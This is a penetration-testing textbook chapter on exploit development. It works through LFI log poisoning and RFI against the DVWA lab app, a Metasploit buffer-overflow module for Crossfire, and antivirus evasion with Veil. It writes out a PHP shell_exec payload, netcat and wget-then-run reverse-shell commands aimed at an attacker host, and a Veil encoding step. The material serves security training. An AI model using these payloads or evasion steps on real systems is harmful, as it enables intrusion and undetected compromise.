- en: Exploit Development
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we are are going to explore **exploit development**. We are
    going to understand how we can use Python to develop custom exploits. Although
    our main focus will be on developing exploits in Python, we will also see how
    we can develop exploits in Ruby to extend the capabilities of the Metasploit framework.
  prefs: []
  type: TYPE_NORMAL
- en: An exploit is nothing but a piece of code, written to exploit a vulnerability
    so that the same piece of code can be reused in different environments. The objective
    of writing an exploit is to ensure that the code is stable and that it will give
    the attacker the control they desire. It should be noted that an exploit is developed
    for a specific kind of vulnerability. It's very important to first understand
    the vulnerability and the manual steps required to exploit it. Once we have a
    clear understanding of this, we can proceed to automate the whole process and
    develop an exploit.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following topics will be covered in this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: Scripting exploits over web-based vulnerabilities.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Developing a Metasploit module to exploit a network service.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Encoding shell codes to avoid detection.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Scripting exploits over web-based vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we are going to use an example of a **Damn Vulnerable Web Application**
    (**DVWA**). We will write an exploit for local and remote file inclusion and ensure
    that we get a reverse shell by executing the exploit. As we know, DVWA has many
    vulnerabilities, which include **Local File Inclusion** (**LFI**) and **Remote
    File Inclusion** (**RFI**).
  prefs: []
  type: TYPE_NORMAL
- en: Local file inclusion is a category of vulnerability typically found in PHP applications
    and is introduced by the improper usage of the `include()` and `require()` functions.
    The `include()` function is used to include a PHP module in the current PHP file
    from where it is invoked. There are occasions in which the developer takes the
    name of the file to be included as an input parameter from the web application,
    which can then be misused by attackers. An attacker can tweak the input parameter
    and can read system files on which they may not have access, such as `/etc/passwd`.
    The same vulnerability can be elevated to acquire a reverse shell from the server.
    If an attacker is able to read the log files of the server, which are usually
    present at the `/var/log/apache2/access.log` path, and an attacker sends a fake
    `GET` request such as `http://myvulsite.com?id=<?php shell_exec($_GET['cmd'])
    ?>`, the application will usually return an error message saying that the requested
    URL/resource doesn't exist. However, this will be logged in the `access.log` file
    of the server. With the help of LFI, if the attacker in the subsequent request
    tries to load the access log file as `http://myvulsite.com/admin.php?page=/var/log/appache2/access.log?cmd=ifconfig%00`,
    it shell loads the log file, which has a PHP code snippet. This will be executed
    by the PHP server. Since the attacker is specifying the CMD parameter, this will
    be executed at the shell, resulting in the execution of unintended code at the
    server. The RFI vulnerability is easier to execute. Let's put what we have discussed
    so far into action by starting the DVWA application and trying to exploit the
    LFI vulnerability manually.
  prefs: []
  type: TYPE_NORMAL
- en: It should be noted that we have already seen how to use Python to write an exploit
    for a network service in [Chapter 12](2239f168-c111-4fd7-a79c-8e39a8cb9aca.xhtml), *Reverse
    Engineering Windows Applications*, where we wrote a custom Python exploit to exploit
    the SLmail service. Refer to that chapter to refresh your knowledge of service-based
    exploit development targeting buffer overflow.
  prefs: []
  type: TYPE_NORMAL
- en: Manually executing an LFI exploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let''s begin by starting the Apache server:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'Let''s try to browse the application manually and see where the vulnerability
    lies:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/22c584ef-a902-4881-b84e-011785536376.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The browsed URL in the preceding screen is `http://192.168.1.102/dvwa/vulnerabilities/fi/?page=include.php`.
    As can be seen, the requested URL has a page parameter, which takes the page that
    is to be included as an argument. If we take a look at the source code of the
    application, we can see the implementation of the `include()` function as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/4251eb69-3f5b-4576-b281-a35dbac69266.png)'
  prefs: []
  type: TYPE_IMG
- en: The preceding screenshot initializes the file variable to the parameter that
    is obtained in the `GET` request, without any filtering.
  prefs: []
  type: TYPE_NORMAL
- en: 'The next screenshot uses the same file variable under the `include()` function
    as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/8edcde7b-3482-447b-80e8-9a7927bc0b64.png)'
  prefs: []
  type: TYPE_IMG
- en: As highlighted, the `include()` function includes whatever the value of the
    `$file` variable might be. Let's try to exploit this and read any system file
    to which we may not have access, such as `/etc/passwd`, by accessing the following
    URL: `http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/etc/passwd`
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/d2e9ffdb-422e-405e-bc5a-32de76e5524d.png)'
  prefs: []
  type: TYPE_IMG
- en: Let's now elevate the attack a little further and try to get a shell from the
    LFI vulnerability. Let's use `Netcat` to poison the log file for us to get the
    shell from the server.
  prefs: []
  type: TYPE_NORMAL
- en: It should be noted that we should not try to poison the log files via the URL.
    Doing so will encode our payload to URL encoding, rendering the attack useless.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s first try to see the contents of the Apache log file and load it on
    our browser window with the URL at: `http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/7bb7967c-dc92-41d6-b24c-c8f020643e36.png)'
  prefs: []
  type: TYPE_IMG
- en: 'As we can see from the preceding screenshot, the contents of the log file are
    displayed on the page. Now let''s go ahead and try to poison the log file using
    `netcat`. First, start Netcat as follows: `nc 192.168.1.102 80`. Once started,
    send the following command to the server: `http://192.168.1.102/dvwa?id=<?php
    echo shell_exec($_GET[''cmd'']);?>`'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/d32a907e-459e-4a88-b7a9-14f67b5ce1d3.png)'
  prefs: []
  type: TYPE_IMG
- en: Bingo! We have now poisoned our log file. Let's now try to issue a command such
    as `ifconfig` to see if it will be executed. The URL we will browse will be as
    follows: `http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=ifconfig`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Notice the `cmd` parameter. We are sending the `ifconfig` command, which will
    be invoked by the following line of code:'
  prefs: []
  type: TYPE_NORMAL
- en: '`<?php echo shell_exec($_GET[''cmd'']);?>, translating to <?php echo shell_exec(ifconfig)?>`'
  prefs: []
  type: TYPE_NORMAL
- en: 'The highlighted area in the following screenshot shows that our command has
    been successfully executed:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/9735f03d-5ff3-45bc-9ccc-a0611ebbab1a.png)'
  prefs: []
  type: TYPE_IMG
- en: Let's now try to get a reverse shell from the same `cmd` parameter. We will
    use `netcat` to get the reverse shell. If netcat is not installed on the server,
    we can also use Python to get the shell. Let's see both in action.
  prefs: []
  type: TYPE_NORMAL
- en: Reverse shell with Netcat
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The URL and command in this case will be as follows: `http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=nc
    -e /bin/sh 192.168.1.102 4444`.'
  prefs: []
  type: TYPE_NORMAL
- en: 'We also need to set up a `netcat` listener that will listen to the incoming
    connections on port `4444`. Let''s do this by executing the `nc -nlvp 4444` command on
    a different Terminal. Now, browse the URL and see whether we get the shell:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/6cb31672-8088-4619-8644-f3f2fd021296.png)'
  prefs: []
  type: TYPE_IMG
- en: 'After browsing this URL, let''s try to see our spawned `netcat` listener to
    see whether we get the shell:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/ac74a96b-fa99-40f3-b85e-5b63cc020431.png)'
  prefs: []
  type: TYPE_IMG
- en: As can be verified, we got a low privileged shell, `www-data`.
  prefs: []
  type: TYPE_NORMAL
- en: Reverse shell with Python
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Now, let''s assume that Netcat is not installed on the server. We will make
    use of Python to obtain the shell. As the underlying server is Linux based, by
    default, Python would be installed on it. We would therefore modify our exploit
    command as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=wget
    http://192.168.1.102/exp.py -O /tmp/exp.py`'
  prefs: []
  type: TYPE_NORMAL
- en: 'As can be seen, we will create an exploit file written in Python and will serve
    it on our attacker machine. Since, for the current example, both the attacker
    and the victim are on same machine, the URL is `http://192.168.1.102`. The contents
    of the exploit file are shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/7c01434c-6c79-4696-a69a-3724bb041b29.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Downloading the exploit file will complete the first step of our exploitation
    process. The second step will be to execute it and get back the listener. This
    can be executed by accessing the following URL: `http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=python
    /tmp/exp.py`'
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s take a look at this in action:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Download and save the Python exploit in the `/tmp` folder: `http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=wget
    http://192.168.1.102/exp.py -O /tmp/exp.py`'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Validate whether it has saved successfully:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/30c5c1f9-b9d3-44b6-b144-48fc116ae178.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Start the `netcat` listener on `444`: `nc -nlvp 4444`.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Launch the command that invokes the `exp.py` script to connect back to the
    attacker box:  `http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=python
    /tmp/exp.py`.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Let''s now see whether our listener has obtained the shell:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/67be60de-978e-41d0-9b6e-ca8163c01804.png)'
  prefs: []
  type: TYPE_IMG
- en: As we can see from the preceding screenshot, we have successfully obtained the
    shell.
  prefs: []
  type: TYPE_NORMAL
- en: Exploit development (LFI + RFI)
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Up until now, we have studied how to exploit the LFI vulnerability manually.
    Let's go ahead and try to develop a generic exploit that will exploit the LFI
    vulnerability for this and other identical applications. In this section, we will
    see how to write an awesome exploit that will exploit both the RFI and the LFI
    vulnerabilities in the DVWA application. Although this exploit has been written
    for the DVWA application, I have tried to make it generic. With certain tweaks,
    we can try it with other applications as well that may have LFI and RFI vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s install the prerequisites:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'After installing `phantomjs`, we need to execute the following on the console: **`unset
    QT_QPA_PLATFORM`**. This is used to handle the error thrown by `phantomjs` when
    it is used on Ubuntu version 16.04, which is as follows: `Message: Service phantomjs
    unexpectedly exited. Status code was: -6`.'
  prefs: []
  type: TYPE_NORMAL
- en: LFI/RFI exploit code
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let''s take a look at the following code that will exploit LFI/RFI vulnerabilities
    in DVWA:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/fa1254bb-ed18-4d07-a749-72f6d49e6574.png)'
  prefs: []
  type: TYPE_IMG
- en: 'In the following code snippet, lines 65-74 check whether the application to
    be tested requires authentication for the vulnerability to be exploited:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/58e6d1f1-3be7-489c-b957-61c30bdb0d7b.png)'
  prefs: []
  type: TYPE_IMG
- en: 'If authentication is required, then the cookie values supplied from the user
    are set at a Selenium Python browser/driver, and the URL is invoked with cookie
    data to have a valid session:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/004a5612-24a9-4a1f-b394-e8ebc59fa3e1.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The lines between 90 and 105 are used to control the LFI vulnerability workflow.
    This section has a sequence of steps that we perform manually. In line 91, we
    prepare the malicious URL that will poison the log file and place a PHP code snippet
    in the `access.log` file. In line 93, we place that malicious URL in a text file
    called `exp.txt` and we ask Netcat to take an input from that file. Remember that
    we used `netcat` when we poisoned the `access.log` file previously; the same operation
    will be repeated here. In line 97, we ask `netcat` to connect to the victim server
    on port `80`, take an input from the `exp.txt` file, and send that input to the
    victim server, so that the log will be poisoned. We do this by creating a bash
    script, `exp.sh`. In line 99, we invoke this bash script, which will in turn invoke
    `netcat` and cause `netcat` to take an input from the `evil.txt` file, thereby
    poisoning the log. In line 103, we set up the exploit URL, the one that we will
    make our simulated selenium browser visit, for it to give us a reverse shell:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/ca58e9a5-7ce5-4b93-b1ad-b94a472b1cf0.png)'
  prefs: []
  type: TYPE_IMG
- en: In line 115, we are invoking a process that will cause the browser to make a
    request to a vulnerable page with the payload using the `start()` method of that
    process, under line 116\. But before actually accessing the exploit, we need to
    set up a netcat listener. Line 119 sets up a Netcat listener and we introduce
    a time delay of five seconds, as can be seen in the definition of the process
    method `send_exp()`, giving time for netcat to start. Once started, the payload
    is delivered with the `send_exp()` method, under line 61\. If everything goes
    well, our listener gets the shell.
  prefs: []
  type: TYPE_NORMAL
- en: The lines 107-113, handle the RFI part of the vulnerability. To exploit the
    RFI, we need to have an evil file created at our attacker machine, `evil.txt`,
    which will deliver the PHP payload. Once created, we need to place it in `/var/www/html/evil.txt`.
    Then, we need to start the Apache server and update the payload delivery URL to
    the address of the RFI. Finally, with the `send_exp()` method, we deliver our
    payload and then start the netcat listener.
  prefs: []
  type: TYPE_NORMAL
- en: 'The preceding code works for both LFI and RFI vulnerabilities. The code given
    takes the user parameters in the following order:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: Executing the LFI exploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'To execute and exploit the LFI vulnerability, we will pass the following parameters
    to the script:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'The preceding command would produce the output, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/0a149bad-cf5b-4443-9498-5362a47481b9.png)![](img/f55804f0-eee1-4ada-9e80-3ba646eadbe7.png)'
  prefs: []
  type: TYPE_IMG
- en: As can be seen, we have successfully obtained a low privileged shell of `www-data`.
  prefs: []
  type: TYPE_NORMAL
- en: Executing the RFI exploit
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'To execute and exploit the RFI vulnerability, we will pass the following parameters
    to the script:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'The preceding command would produce the output, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/a18dd40a-9e5c-4566-89b0-4f45e5a734d6.png)'
  prefs: []
  type: TYPE_IMG
- en: As we can see, we successfully obtained the shell for the RFI vulnerability
    as well.
  prefs: []
  type: TYPE_NORMAL
- en: Developing a Metasploit module to exploit a network service
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this section, we will see how to make a Metasploit exploit module to exploit
    a given vulnerability. In this case, we will focus on a buffer overflow vulnerability
    of a gaming application called *Crossfire*. For us to write custom Metasploit
    modules, we need to place them in a specific directory, because when we use the
    `use exploit /....` command in Metasploit, by default, the framework looks for
    the available modules in the default Metasploit exploits directory. If it doesn''t
    find the given exploit there, it then searches the extended modules directory,
    which is located at the following path: `/root/msf4/modules/exploits`. Let''s
    create the path and a custom directory. We''ll turn our Kali VM on and run the
    following commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: The preceding command will create a file called `custom_cf` within the `/root/.msf4/modules/exploits/custom/cf` directory.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, let''s edit the `custom_cf.rb` file and place the following content in
    it:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/672e6ba9-81f8-4603-a9ad-cdb9657f1aa8.png)'
  prefs: []
  type: TYPE_IMG
- en: '![](img/214be2c9-1973-4f30-bd38-57ddd2c2c4a1.png)'
  prefs: []
  type: TYPE_IMG
- en: The preceding mentioned code snippet is very straightforward. It makes an attempt
    to exploit the buffer overflow vulnerability present in the Crossfire application.
    Metasploit has a defined template for its exploit modules, and if we have to write
    a module in Metasploit, we need to tweak the template according to our requirements.
    The preceding template is the one used for the buffer overflow class of vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: 'We studied buffer overflows in great detail in the previous chapters. Based
    on what we have learned, we can say that to exploit a buffer overflow vulnerability,
    an attacker must know the following:'
  prefs: []
  type: TYPE_NORMAL
- en: The size of payload that the buffer space can accommodate.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The return address of the stack, which must be overwritten by the address of
    the buffer where the exploit code is injected. The actual return address would
    vary, but the offset of the payload after which the return address would get overwritten
    can be computed. Once we have the offset, we can place the address of the memory
    location where we are able to inject the exploit.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The set of characters recognized as bad characters by the application, which
    might hamper the execution of our exploit.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The amount of padding needed.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The architecture and OS details.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: For the attacker to obtain the items mentioned, they perform a series of steps,
    which includes fuzzing, offset computation, return address checks, bad character
    checks, and so on. If the preceding values are known, the next step for the attacker
    is usually to generate an encoded payload and send it to the service and get a
    reverse shell. If the preceding values are not known, Metasploit provides a buffer
    overflow template, where the values can just be plugged in and used, without requiring
    us to write custom code from scratch.
  prefs: []
  type: TYPE_NORMAL
- en: The application under discussion, Crossfire, has been fuzzed and debugged offline.
    According to the fuzzing results, the obtained return address or value of the
    EIP is `0X0807b918`. In other words, this implies that if we overflow the buffer,
    the exploit code will be placed at the location with the following address: `0X0807b918`.
    Furthermore, as can be seen above, the amount of padding specified is 300 (spaces).
    We have also specified the bad characters: `\x00\x0a\x0d\x20`. As well as this,
    we have specified that the platform is Linux.
  prefs: []
  type: TYPE_NORMAL
- en: 'Please Note : A bad character is a character which  is not recognized by the
    character-set of the program being tested , as of which it can make the program
    act in unexpected manner. in order to figure out the common bad characters for
    the underlying software being tested , the most successful method is trial and
    error.What i usually do to figure out the common bad characters , is to send all
    unique characters to the application , and then using the debugger ,we check what
    characters are changed at register level. The ones that get changed can be encoded
    and avoided.'
  prefs: []
  type: TYPE_NORMAL
- en: 'Therefore, in line 43, when we invoke the `payload.invoke` command, Metasploit internally creates
    a reverse Meterpreter TCP payload and encodes it, which returns a shell at port
    `4444`. Let''s try to see this in action:'
  prefs: []
  type: TYPE_NORMAL
- en: 'First, let''s install and start the crossfire application. The vulnerable version
    of the crossfire application can be found at the following URL [https://osdn.net/projects/sfnet_crossfire/downloads/crossfire-server/1.9.0/crossfire-1.9.0.tar.gz/](https://osdn.net/projects/sfnet_crossfire/downloads/crossfire-server/1.9.0/crossfire-1.9.0.tar.gz/).
    Download it and unzip it with the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'Then, start the vulnerable server as follows:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![](img/98107c65-0bc0-49dc-ab3e-c966c6264711.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now go ahead and start Metasploit. Export the module we created, and try to
    exploit the vulnerable server:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/9f271686-e0b4-46fd-b09e-a2f0f2a3b0c2.png)'
  prefs: []
  type: TYPE_IMG
- en: As we can see, the exploit we developed work flawlessly and gave us the reverse
    shell of the victim's machine, which, in our case, is the same machine as we are
    working on.
  prefs: []
  type: TYPE_NORMAL
- en: Encoding shell codes to avoid detection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Let''s now say that we have identified a vulnerability in an underlying service
    that we are testing. However, in this case, the box has got antivirus software
    installed. Any good antivirus software will contain all the signatures of well-known
    exploits, and typically the signatures for almost all the Metasploit exploit modules
    would be present. It is therefore imperative for us to use a methodology that
    would evade the antivirus detection. This means we need to use some sort of encoding
    or any other method to deliver our payload to avoid AV detection. There are three
    different ways that we can do this:'
  prefs: []
  type: TYPE_NORMAL
- en: The most successful method is to develop a custom exploit in a language of your
    choice (Python/C/C++/Java). This method is useful, because a custom exploit will
    not have any AV signatures and would usually evade the AV protection. Alternatively,
    we can also download a public exploit and modify it heavily to change the signature
    that it produces. The exploits we developed in the web exploitation use cases
    were both written from scratch and so theoretically no AV should pick them up.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The second method is to inject our payload/exploit in the process memory of
    the underlying system. Doing that will execute the code in the memory, and this
    would not be detected with most antivirus software.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The third method is to make use of encoding to prevent detection. In this section,
    we are going to see how we can make use of a very powerful encoding framework
    called VEIL to make a payload that might evade AV detection.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Downloading and installing Veil
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'It should be noted that Veil comes pre-installed with the latest version of
    Kali Linux. For other versions of Linux, we can install Veil with the following
    commands:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'Once Veil is successfully installed, the generation of veil encoded payloads
    is a very simple task. What happens behind the scenes while using veil is that
    , it makes an attempt to make the exploit code cryptic and random , so that the
    AV''s which work on signature based detection could be fooled from the randomness
    and cryptic nature of the exploit. There are two methods of doing this. One method
    is to use the interactive shell that veil provides. This can be invoked by typing
    the command `veil` and then choosing a payload under the evasion module. The other,
    easier option, is to specify all the options at the command line as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: 'The previous command will use Veil''s payload number `41` to carry out the
    encoding of the Metasploit module `windows/meterpreter/reverse_tcp`. This will
    produce the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/df1f54a8-9f90-49b6-93f3-619126499a09.png)'
  prefs: []
  type: TYPE_IMG
- en: The preceding screenshot shows the exploit that would be encoded by Veil and
    that can be delivered to the victim to see whether it evades the antivirus software.
    If it doesn't, then we must use the interactive version of Veil to tweak the payload
    parameters for it to generate a signature that is more unique. You can find more
    information about Veil from the links shared in the *Further reading* section.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we learned about developing custom exploits to exploit web
    and network services. We also discussed how we can evade our exploit from antivirus
    software. Furthermore, we explored various web vulnerabilities, such as LFI and
    RFI, and talked about how these can be elevated to get a reverse shell from the
    victim. It's important to understand that exploit development requires a good
    understanding of the underlying vulnerability, and we should always try to make
    generic exploits that are reusable. Feel free to modify the exploit codes we discussed
    to make them generic and try them out with other applications.
  prefs: []
  type: TYPE_NORMAL
- en: In the next chapter, we will step out of the penetration-testing ecosystem and
    understand a little more about the **Security operations center** (**SOC**), or
    the monitoring ecosystem of cyber security. We will understand what cyber threat
    intelligence is and how it can be used to safeguard an organization against potential
    threats. We will also understand how cyber threat intelligence can be automated
    to supplement detection capabilities with the help of a SIEM tool.
  prefs: []
  type: TYPE_NORMAL
- en: Questions
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: What other web-based vulnerabilities can be exploited with custom exploits?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: How can we improve the exploit code developed to try various other possibilities
    if one attack vector fails?
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Further reading
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Exploit development in Python: [https://samsclass.info/127/127_WWC_2014.shtml](https://samsclass.info/127/127_WWC_2014.shtml)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Python exploit development assistance: [https://github.com/longld/peda](https://github.com/longld/peda)
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Creating Metasploit modules: [https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules](https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Veil: [https://www.veil-framework.com/veil-tutorial/](https://www.veil-framework.com/veil-tutorial/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
